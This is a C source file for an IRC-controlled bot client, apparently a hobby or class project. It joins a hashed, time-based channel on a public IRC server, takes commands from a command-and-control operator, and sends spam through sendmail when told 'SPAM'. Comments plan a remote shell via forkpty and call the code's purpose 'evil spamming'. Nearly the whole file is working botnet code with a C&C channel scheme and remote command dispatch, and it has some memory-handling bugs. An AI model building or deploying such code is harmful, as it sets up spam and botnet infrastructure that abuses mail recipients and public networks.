#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <time.h>

#define buffer_size 2048

char in_buffer[buffer_size];
char out_buffer[buffer_size];
FILE *sh_pipe;

/* DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS
 * see stackoverflow/questions/476354/how-do-nix-pseudo-terminals-work-whats-the-master-slave-channel
 * for information on creating pseudoshells
 * Basically what you want to do is forkpty yourself a shell process
 * probably just do it in main because it's lightweight, and then conditionally
 * depending on which side of the fork you ended up in either go and run the
 * bot code or run commands off input and write them to output.
 *
 * The only thing to consider is that the server will send information about
 * the shell opening and closing, but you can ignore this information if you go
 * this route. Another option is to only open a shell when the C&C requests it,
 * but that requires a bit more attention as to state.
 */

/* Function: strpref
 * Determines if its first argument is a prefix of its second.
 */
bool strpref(const char *pre, const char *str) {
    size_t pre_len = strlen(pre);
    size_t str_len = strlen(str);
    return str_len < pre_len ? false : strncmp(pre, str, pre_len) == 0;
}

/* Function: sendmail
 * Invokes sendmail. Basic structure courtesy trojanfoe @ stackoverflow.
 */
void sendmail(const char *to, const char *from, const char *subject, const char *message) {
    // open a pipe to sendmail to do our evil spamming bidding
    FILE *sendmail_pipe = popen("/usr/sbin/sendmail -t", "w");
    if (sendmail_pipe != NULL) {
        fprintf(sendmail_pipe, "To: %s\nFrom: %s\nSubject: %s\n\n", to, from, subject);
        fwrite(message, sizeof(char), strlen(message), sendmail_pipe);
        const char *terminator = ".\n";
        fwrite(terminator, sizeof(char), strlen(terminator), sendmail_pipe);
        pclose(sendmail_pipe);
    } // fail silently
}

/* Function: randstr
 * Generates a random string of length len,
 * malloced onto the heap.
 */
char *randstr(size_t len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    char *str = malloc(len + 1);

    size_t i = 0;
    for (; i < len; i++) {
        str[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }
    str[len] = '\0';
    return str;
}

/* Function: hash
 * A simple multiply mod prime hash for building reproducible
 * randomish numbers here and on the python C&C.
 */
unsigned long long hash(unsigned long long i) {
    unsigned long long prime = 32416189063ULL;
    unsigned long long mult = 569059615ULL;
    return (i * mult) % prime;
}

/* Function: generate_channel
 * generates a unique channel for communication
 * with the C&C on the basis of when it attempted
 * to connect. Malloced.
 */
char *generate_channel() {
    time_t t = time(NULL);
    time_t max_channel_age = 100000; // approximately 27 hours
    unsigned long long s = t/max_channel_age;
    unsigned long long bit_a = hash(s);

    unsigned long long mask = 0x00000000FFFFFFFF;
    // each of these has 32 viable bits
    unsigned long long bit_b = hash(bit_a);
    unsigned long long bit_c = hash(bit_b);
    unsigned long long bit_d = hash(bit_c);
    unsigned long long bit_e = hash(bit_d);
    unsigned int char_bits_1 = (unsigned int) (bit_b & mask);
    unsigned int char_bits_2 = (unsigned int) (bit_c & mask);
    unsigned int char_bits_3 = (unsigned int) (bit_d & mask);
    unsigned int char_bits_4 = (unsigned int) (bit_e & mask);
    // '#' character, 16 random characters,
    char *channel_name = malloc(1 + 32 + 1);
    sprintf(channel_name, "#%08x%08x%08x%08x",
            char_bits_1, char_bits_2, char_bits_3, char_bits_4);
    return channel_name;
}

/* Function: random_nick
 * creates a random IRC nickname with the prefix
 * "bot_" and an alphanumeric postfix of length
 * nick_len. Malloced.
 */
char *random_nick(size_t nick_len) {
    char *nick_prefix = "bot_";
    char *nick = malloc(strlen(nick_prefix) + nick_len + 1);
    strcpy(nick, nick_prefix);

    char *random_postfix = randstr(nick_len);
    strcpy(nick + strlen(nick_prefix), random_postfix);
    free(random_postfix);
    return nick;
}

/* Function rstrip
 * Strips whitespace off the end of the string
 */
void rstrip(char *to_strip) {
    char *end = to_strip + strlen(to_strip) - 1; // character just before '\0'
    while (end >= to_strip && isspace(*end)) {
        *end = '\0';
        end--;
    }
}

/* Function: handle_command
 * Processes a single line from the C&C or IRC server.
 * Does things like respond to pings, dispatch spam...
 */
void handle_command(char *msg, int conn, char *channel) {
    while (isspace(*msg)) msg++;
    rstrip(msg);

    //printf("%s\n", msg);
    if (strpref("PING ", msg)) {
        memset(out_buffer, 0, buffer_size);
        sprintf(out_buffer, "PONG %s\r\n", msg);
        send(conn, out_buffer, strlen(out_buffer), 0);
    }
    char *payload;
    if ((payload = strstr(msg, channel))) {
        payload += strlen(channel) + 2;
        if (strpref("SPAM", payload)) {
            const char *email_to = "chstansbury@gmail.com";
            // need to figure out rest of sendmail config
            const char *email_from = "spammy@email.com";
            const char *email_subject = "An interesting offer.";
            const char *email_msg = "Nothing nefarious here.";
            sendmail(email_to, email_from, email_subject, email_msg);
        }
    }
}

/* Function: command_loop
 * Waits on input from the C&C and performs some *devious*
 * tasks.... On first connection also announces itself.
 */
void command_loop(int conn, char *channel) {
    while(!sleep(1)) {
        memset(in_buffer, 0, buffer_size);
        recv(conn, in_buffer, buffer_size, 0);

        const char *irc_sep = "\r\n";
        char *token = strtok(in_buffer, irc_sep);
        while(token) {
            handle_command(token, conn, channel);
            token = strtok(NULL, irc_sep);
        }
    }
}

/* Function: greet_irc
 * Performs the step of letting the irc know we're
 * here and attaching to a given channel.
 * This is pretty gross and should use a variadic helper
 */
void greet_irc(int conn, char *nick, char *channel) {
    memset(out_buffer, 0, buffer_size);
    sprintf(out_buffer, "NICK %s\r\n", nick);
    send(conn, out_buffer, strlen(out_buffer), 0);

    memset(out_buffer, 0, buffer_size);
    sprintf(out_buffer, "USER %s %s %s :%s\r\n", nick, nick, nick, nick);
    send(conn, out_buffer, strlen(out_buffer), 0);

    memset(out_buffer, 0, buffer_size);
    sprintf(out_buffer, "PRIVMSG R : Login <>\r\n");
    send(conn, out_buffer, strlen(out_buffer), 0);

    memset(out_buffer, 0, buffer_size);
    sprintf(out_buffer, "MODE %s + x\r\n", nick);
    send(conn, out_buffer, strlen(out_buffer), 0);

    memset(out_buffer, 0, buffer_size);
    sprintf(out_buffer, "JOIN %s\r\n", channel);
    send(conn, out_buffer, strlen(out_buffer), 0);

    memset(out_buffer, 0, buffer_size);
    sprintf(out_buffer, "PRIVMSG %s :Hi there server.\r\n", channel);
    send(conn, out_buffer, strlen(out_buffer), 0);
}

int main (int argc, char **argv) {
    srand(time(NULL));
    char *irc_nick = random_nick(10);
    char *irc_channel = generate_channel();
    char *irc_host = "chat.freenode.net";
    int irc_port = 6667;

    struct hostent *freenode_he = gethostbyname(irc_host);
    if (!freenode_he) {
        // failed resolving freenode
        //printf("Failed resolving host.\n");
        free(irc_nick);
        free(irc_channel);
        return 0;
    }

    int conn;
    if ((conn = socket(PF_INET, SOCK_STREAM, 0)) < 0)  {
        // failed creating socket
        //printf("Failed creating socket.\n");
        free(irc_nick);
        free(irc_channel);
        free(freenode_he);
        return 0;
    }

    struct sockaddr_in client;
    memcpy(&client.sin_addr, freenode_he->h_addr_list[0], freenode_he->h_length);
    client.sin_family = AF_INET;
    client.sin_port = htons(irc_port);

    if (connect(conn, (struct sockaddr *) &client, sizeof(client)) < 0) {
        // couldn't actually connect
        free(irc_nick);
        free(irc_channel);
        free(freenode_he);
    }

    // actually let freenode know that we're here
    // and connect to the appropriate channel
    greet_irc(conn, irc_nick, irc_channel);

    // enter the command loop
    command_loop(conn, irc_channel);

    free(irc_nick);
    free(irc_channel);
}
